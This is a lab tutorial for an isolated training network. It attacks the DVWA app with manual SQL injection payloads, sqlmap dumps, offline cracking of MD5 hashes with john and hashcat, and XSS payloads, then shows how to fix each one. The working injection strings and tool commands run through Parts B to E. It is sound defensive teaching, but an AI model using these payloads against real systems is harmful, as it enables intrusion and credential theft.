---
title: "Scenario 03 - Web: SQL injection on DVWA (manual -> sqlmap -> crack)"
---

# Scenario 03 - Web: SQL injection on DVWA (manual -> sqlmap -> crack)

> **Authorized lab only.** Every target here is a container **we own** on the isolated
> `10.13.37.0/24` hacklab net (no route to the real LAN or the internet). The point is to attack our
> own app to learn how to **defend** it: every offensive step below is paired with the fix.

| | |
|---|---|
| **Goal** | Find and exploit SQL injection in DVWA by hand, then automate with `sqlmap`, dump the `users` table, crack the password hashes offline. Then harden and prove the attack fails. |
| **Target** | DVWA - `http://10.13.37.34/` (login `admin` / `password`) |
| **Difficulty** | Beginner -> Intermediate |
| **Est. time** | 60-90 min |
| **Prereqs** | Scenario 01/02 done or comfortable on Kali; `kali` VM up at `10.13.37.10`; a browser (Firefox on Kali). Tools (all preinstalled): `whatweb`, `gobuster`, `nikto`, `sqlmap`, `curl`, `john`, `hashcat`, Burp Suite, `seclists` at `/usr/share/seclists`, `rockyou` at `/usr/share/wordlists/rockyou.txt.gz`. |
| **Start from** | Ensure the web container is up. On the **host**: `docker ps --filter name=dvwa` should show `dvwa` running; if not, `docker start dvwa` (or see Cleanup/reset). From Kali confirm reach: `curl -s -o /dev/null -w '%{http_code}\n' http://10.13.37.34/login.php` -> `302` or `200`. |

## MITRE ATT&CK mapping
- **T1190 - Exploit Public-Facing Application** (Initial Access): the SQL injection itself.
- **T1110.002 - Brute Force: Password Cracking**: offline cracking of the dumped MD5 hashes with `john`/`hashcat`.
- **T1552 - Unsecured Credentials**: password hashes recoverable straight out of the app DB.
- **XSS (bonus)** maps loosely to **T1059.007 - Command and Scripting Interpreter: JavaScript**; in OWASP terms it is **A03:2021 Injection**, same family as SQLi.

---

## Part A - Recon (know the target before you touch it)

All commands run **on Kali** (`10.13.37.10`) unless it says "browser".

### Step 1 - Fingerprint the web stack
```bash
whatweb http://10.13.37.34/
```
**What it does:** identifies server, language, framework, and often the app.
**What you should see:** something like `Apache`, `PHP/x.x`, `X-Powered-By`, and a title referencing DVWA. This tells you it is a PHP app on Apache - MySQL is the likely backend, so SQLi is on the table.

### Step 2 - Directory / content discovery
```bash
gobuster dir -u http://10.13.37.34/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt -t 30
```
**What it does:** brute-forces common paths/files so you learn the app's layout without a login.
**What you should see:** hits such as `/login.php`, `/setup.php`, `/security.php`, `/instructions.php`, and a `/vulnerabilities/` area. `/vulnerabilities/sqli/` is our SQLi page.

### Step 3 - Quick vuln sweep (optional but instructive)
```bash
nikto -h http://10.13.37.34/
```
**What it does:** flags obvious misconfigurations and known issues.
**What you should see:** notes about missing security headers (`X-Frame-Options`, `Content-Security-Policy`), directory indexing, and default files. Keep this output - the missing headers become a defense talking point later.

### Step 4 - Log in and set Security = Low
1. Browser -> `http://10.13.37.34/login.php` -> log in `admin` / `password`.
2. Left menu -> **DVWA Security** (`http://10.13.37.34/security.php`).
3. Set the level to **Low**, click **Submit**.

**What you should see:** "Security level is currently: low". This makes the code path deliberately unsafe so you can learn the mechanics; we raise it to **Impossible** at the end to prove the fix.

---

## Part B - Manual SQL injection (understand it before automating)

Open **SQL Injection** (`http://10.13.37.34/vulnerabilities/sqli/`). There is a **User ID** text box
and a **Submit** button. Submitting `id=1` runs, server-side, roughly:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```
The value is concatenated into the query inside single quotes - that is the flaw.

### Step 5 - Confirm the injection (break out of the string)
In the **User ID** box enter:
```
1' OR '1'='1
```
Click Submit.
**What it does:** closes the quote and adds an always-true condition, so the `WHERE` matches every row.
**What you should see:** first/last names for **multiple** users, not just one. That is the classic SQLi tell: the boolean changed the result set. (Notice the payload rides in the URL: `?id=1' OR '1'='1&Submit=Submit`.)

Now trigger an error to prove the quote breaks the query:
```
1'
```
**What you should see:** a MySQL syntax error (or a broken/empty result). Confirms unbalanced quoting -> injectable.

### Step 6 - Find the number of columns (`ORDER BY`)
Enter each and submit:
```
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#
```
**What it does:** `ORDER BY n` fails when `n` exceeds the column count. `#` comments out the trailing `'`.
**What you should see:** `1` and `2` work; **`3` errors** ("Unknown column '3' in 'order clause'"). So the query returns **2 columns** - what a UNION must match.

### Step 7 - UNION: pull database/version info into the two visible fields
```
1' UNION SELECT null, version()#
1' UNION SELECT null, database()#
1' UNION SELECT user(), @@version#
```
**What it does:** appends a second result set with the same 2 columns; whatever you SELECT appears where First/Surname normally render.
**What you should see:** the MySQL version string, the database name (`dvwa`), the DB user. You now control the SELECT.

### Step 8 - Enumerate tables and columns from `information_schema`
```
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()#
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'#
```
**What you should see:** a `users` table; columns including `user_id`, `first_name`, `last_name`, **`user`**, **`password`**, `avatar`. `user` + `password` are the prize.

### Step 9 - Dump the credentials by hand
```
1' UNION SELECT user, password FROM users#
```
**What it does:** returns every username and its stored password hash.
**What you should see:** rows like:
```
admin    5f4dcc3b5aa765d61d8327deb882cf99
gordonb  e99a18c428cb38d5f260853678922e03
1337     8d3533d75ae2c3966d7e0d4fcc69216b
pablo    0d107d09f5bbe40cade3de5c71e9e9b7
smithy   5f4dcc3b5aa765d61d8327deb882cf99
```
Those 32-hex strings are **unsalted MD5** hashes. Save them - you will crack them in Part D. This is
**evidence #1** (full credential dump via manual SQLi).

---

## Part C - Automate with sqlmap (same bug, at scale)

`sqlmap` needs to act as your logged-in session, so it needs your DVWA cookies: the session id **and**
the `security=low` cookie.

### Step 10 - Grab the session cookies

**Option A - from the browser (easiest):** in Firefox, open Developer Tools (F12) -> **Storage** ->
**Cookies** -> `http://10.13.37.34`. Copy the **`PHPSESSID`** value. The `security` cookie should read
`low` (set it on the DVWA Security page if not).

**Option B - from the shell (no browser):**
```bash
# 1) fetch login page + capture the anti-CSRF token and the session cookie
curl -s -c /tmp/dvwa.cj http://10.13.37.34/login.php -o /tmp/login.html
TOKEN=$(grep -oP "name='user_token'\s+value='\K[0-9a-f]+" /tmp/login.html)
# 2) authenticate (updates the cookie jar with a logged-in PHPSESSID)
curl -s -b /tmp/dvwa.cj -c /tmp/dvwa.cj \
  --data "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  http://10.13.37.34/login.php -o /dev/null
# 3) set the security level to low on this session
curl -s -b /tmp/dvwa.cj -c /tmp/dvwa.cj \
  "http://10.13.37.34/security.php" -o /dev/null \
  --data-urlencode "security=low" --data-urlencode "seclev_submit=Submit"
# 4) read the PHPSESSID back
grep PHPSESSID /tmp/dvwa.cj | awk '{print $NF}'
```
**What you should see:** a 26-char hex `PHPSESSID`. Use it below.

### Step 11 - Detect the injection with sqlmap
Replace `SID` with your `PHPSESSID`:
```bash
sqlmap -u "http://10.13.37.34/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=SID; security=low" \
  --batch --level=2 --risk=1
```
**What it does:** probes the `id` parameter with many payloads and classifies the injection.
**What you should see:** sqlmap confirms `id` is injectable and lists techniques (boolean-based blind, error-based, UNION), plus the backend (MySQL). If it says "all tested parameters do not appear to be injectable", your cookie/`security` value is wrong - re-do Step 10.

### Step 12 - Enumerate and dump the users table
```bash
# list databases
sqlmap -u "http://10.13.37.34/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=SID; security=low" --batch --dbs
# dump the users table from the dvwa database
sqlmap -u "http://10.13.37.34/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=SID; security=low" --batch -D dvwa -T users --dump
```
**What it does:** repeats Part B automatically, then extracts every row.
**What you should see:** a table of `user_id / first_name / last_name / user / password / ...`, and sqlmap **offers to crack the hashes** with its built-in dictionary ("do you want to crack them via a dictionary-based attack?"). Say yes to let it try rockyou-style words, or crack them yourself in Part D. Dumped data is written under `~/.local/share/sqlmap/output/10.13.37.34/` (path shown in the run) - **evidence #2**.

---

## Part D - Crack the hashes offline

The dump gives you unsalted MD5. Cracking them turns hashes into usable passwords.

### Step 13 - Prepare wordlist and hash file
```bash
# rockyou ships gzipped - decompress a working copy once
gunzip -kf /usr/share/wordlists/rockyou.txt.gz     # -> /usr/share/wordlists/rockyou.txt
# put the dumped hashes (one per line) into a file
cat > ~/dvwa_hashes.txt <<'EOF'
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
EOF
```

### Step 14 - Crack with John the Ripper
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt ~/dvwa_hashes.txt
john --format=raw-md5 --show ~/dvwa_hashes.txt
```
**What you should see:** cracked pairs - `password`, `abc123`, `charley`, `letmein`. That is
**evidence #3**: from an injectable form to plaintext admin credentials.

### Step 15 - Same job with hashcat (mode 0 = MD5)
```bash
hashcat -m 0 -a 0 ~/dvwa_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 --show ~/dvwa_hashes.txt
```
**What you should see:** the same plaintexts. (Two tools, same result - useful to know both.)

---

## Part E - Bonus vuln: reflected and stored XSS (same input-trust failure)

SQLi trusts input in a **query**; XSS trusts input in the **page**. Same root cause, different sink.

### Step 16 - Reflected XSS
1. Browser -> **XSS (Reflected)** (`http://10.13.37.34/vulnerabilities/xss_r/`).
2. In the **name** box enter:
   ```
   <script>alert(document.cookie)</script>
   ```
3. Submit.

**What you should see:** a JavaScript alert box showing your cookies. The app echoed your input into the
HTML with no encoding, so the browser executed it. (Reflected = it fires only for someone who follows a
crafted link carrying that value.)

### Step 17 - Stored XSS
1. Browser -> **XSS (Stored)** (`http://10.13.37.34/vulnerabilities/xss_s/`).
2. **Name** = `t`, **Message** =
   ```
   <script>alert('stored-xss')</script>
   ```
   (The Name box has a `maxlength`; the Message box is the reliable sink. If Name is length-limited in the DOM, edit the `maxlength` attribute in dev tools or inject via the Message field.)
3. Sign the guestbook.

**What you should see:** the alert fires **now and every time anyone loads the page** - the payload is
persisted in the DB. Stored XSS is worse than reflected: it hits every visitor with no link needed.

---

## Part F - Defense: fix it, then prove the fix

The lesson is the fix. Two layers: **fix the code** (primary), **harden around it** (defense in depth).

### The code fixes
- **SQL injection -> parameterized queries / prepared statements.** Never concatenate input into SQL.
  DVWA's own **Impossible** source uses PDO with a bound parameter and validates the id is numeric:
  ```php
  $id = $_GET['id'];
  // Impossible level (paraphrased): input must be numeric, and the query is a prepared statement
  if (is_numeric($id)) {
      $stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1');
      $stmt->bindParam(':id', $id, PDO::PARAM_INT);
      $stmt->execute();
  }
  ```
  Bound parameters are sent to the DB as **data**, never parsed as SQL, so `1' OR '1'='1` becomes a
  literal string that matches nothing. Impossible also requires an **anti-CSRF `user_token`**.
- **XSS -> contextual output encoding + input validation.** Encode on output for the context
  (`htmlspecialchars()` for HTML body, attribute encoding for attributes, etc.). DVWA's high/impossible
  XSS code runs user data through `htmlspecialchars()` so `<script>` renders as inert text.
- **Input validation** everywhere as a secondary gate: an `id` that must be an integer should be rejected
  if it is not (whitelist the shape of expected input; do not rely on blacklisting bad characters).

### Harden around the app (defense in depth)
- **Least privilege on the DB account** - the web user should not read arbitrary schema; drop access to
  `information_schema` where possible; separate accounts per app.
- **Store passwords correctly** - never MD5. Use a slow, salted algorithm (`bcrypt`/`argon2`). Then a
  dump like Step 12 yields hashes that rockyou cannot trivially crack.
- **WAF** in front (e.g. ModSecurity + OWASP CRS) to blunt automated tools like sqlmap - a delaying
  control, not a substitute for parameterized queries.
- **Security headers** - the ones `nikto` flagged missing: `Content-Security-Policy` (kills most XSS
  execution), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`.

### Step 18 - Prove SQLi is fixed: switch DVWA to Impossible and re-run sqlmap
1. Browser -> **DVWA Security** -> set level to **Impossible** -> Submit. (Confirm: "Security level is currently: impossible".)
2. Refresh your cookies for the new level. If you used the shell method, re-run Step 10 substituting
   `security=impossible`; if you used the browser, copy the current `PHPSESSID`.
3. Re-run sqlmap against the Impossible endpoint (note the different page + the CSRF token requirement):
```bash
sqlmap -u "http://10.13.37.34/vulnerabilities/sqli_impossible/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=SID; security=impossible" \
  --csrf-token=user_token \
  --batch --level=3 --risk=2
```
**What you should see:** sqlmap reports **"all tested parameters do not appear to be injectable"** (it
may also note the CSRF token and the numeric-only input). The bug is gone because the query no longer
parses input as SQL. **This is the proof the fix works.** For completeness, retry the manual
`1' OR '1'='1` in the browser at Impossible -> it returns nothing / is rejected, not a full dump.

### Step 19 - Prove XSS is mitigated
Set DVWA Security to **High** or **Impossible**, retry Steps 16-17 with `<script>alert(1)</script>`.
**What you should see:** the payload is displayed as **text** (`&lt;script&gt;...`) and does **not**
execute - output encoding neutralised it.

---

## Flags / evidence captured
- **Evidence #1** - manual UNION dump of `dvwa.users` (usernames + MD5 hashes) via the browser.
- **Evidence #2** - `sqlmap` automated dump, saved under `~/.local/share/sqlmap/output/10.13.37.34/`.
- **Evidence #3** - cracked plaintext passwords (`password`, `abc123`, `charley`, `letmein`) from
  `john`/`hashcat` (`~/dvwa_hashes.txt`, and `john --show`).
- **Bonus** - reflected + stored XSS proven (cookie alert / persistent alert).
- **Proof-of-fix** - sqlmap "not injectable" and XSS rendered inert at Impossible/High.

## Cleanup / reset
DVWA is a container; reset it, do not nurse it back:
```bash
# on the HOST (containers live on the host, not on Kali)
docker restart dvwa                 # quick reset (clears the stored-XSS guestbook, session)
# full clean rebuild if it got wedged:
docker rm -f dvwa
docker run -d --name dvwa --network hacklab-mv --ip 10.13.37.34 \
  --restart unless-stopped vulnerables/web-dvwa
# then in the browser hit http://10.13.37.34/setup.php -> "Create / Reset Database"
```
On Kali, remove your working files if you want a clean slate:
`rm -f ~/dvwa_hashes.txt /tmp/dvwa.cj /tmp/login.html` and clear sqlmap output with
`rm -rf ~/.local/share/sqlmap/output/10.13.37.34`. Set DVWA Security back to **Low** for the next student.

## Go deeper
Stuck or curious about *why* a step behaves as it does? Ask the lab tutor, e.g.:
- Research: why does 1' ORDER BY 3# error but ORDER BY 2# works on DVWA sqli?
- Research: sqlmap says not injectable at Impossible - explain what PDO prepared statements changed
- Research: how do salted bcrypt hashes defeat my rockyou crack in step 14?
